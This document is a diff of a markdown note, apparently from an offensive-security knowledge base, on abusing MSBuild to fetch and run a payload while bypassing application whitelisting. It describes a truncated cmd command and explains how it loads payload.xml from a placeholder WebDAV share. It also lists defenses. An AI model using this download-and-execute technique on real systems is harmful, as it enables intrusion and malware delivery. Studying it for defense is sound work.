@@ -34,6 +34,8 @@ Technical Description: An attacker can use Msbuild to download and execute files
 
 Business Value: This technique can be used to gain initial access to a network and bypass application whitelisting solutions. This can allow an attacker to steal sensitive data, install malware or ransomware, and cause significant damage to the target organization.
 
+ 
+
 ## Requirements
 
 1. Access to a target system with Msbuild installed
@@ -41,6 +43,8 @@ Business Value: This technique can be used to gain initial access to a network a
 1. Permissions to execute Msbuild
 
 1. A payload to download and execute
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ Business Value: This technique can be used to gain initial access to a network a
 
 1. Use anti-malware and endpoint detection and response (EDR) solutions to detect and respond to attacks
 
+ 
+
 ## Objectives
 
 1. Download and execute a payload on a target system
@@ -58,11 +64,19 @@ Business Value: This technique can be used to gain initial access to a network a
 
 1. Gain initial access to a network
 
+ 
+
 # Instructions
 
 1. This command executes MSBuild.exe to preprocess a specified XML file and outputs the result to a new file named payload.xml.
 
+ 
+
+
+
 **Code**: [[cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framew]]
+
+
 
 > The argument /noautoresponse disables automatic responses to prompts during the build process. The argument /preprocess specifies that the XML file should be preprocessed. The argument \\webdavserver\folder\payload.xml specifies the location of the input XML file. The output is redirected to a new file named payload.xml. The final argument !MB! payload.xml specifies that the preprocessed XML file should be built using MSBuild.exe.
 
@@ -85,3 +99,5 @@ Business Value: This technique can be used to gain initial access to a network a
 
 - [[Msbuild]]
 - [[Windows - Download and execute methods]]
+
+
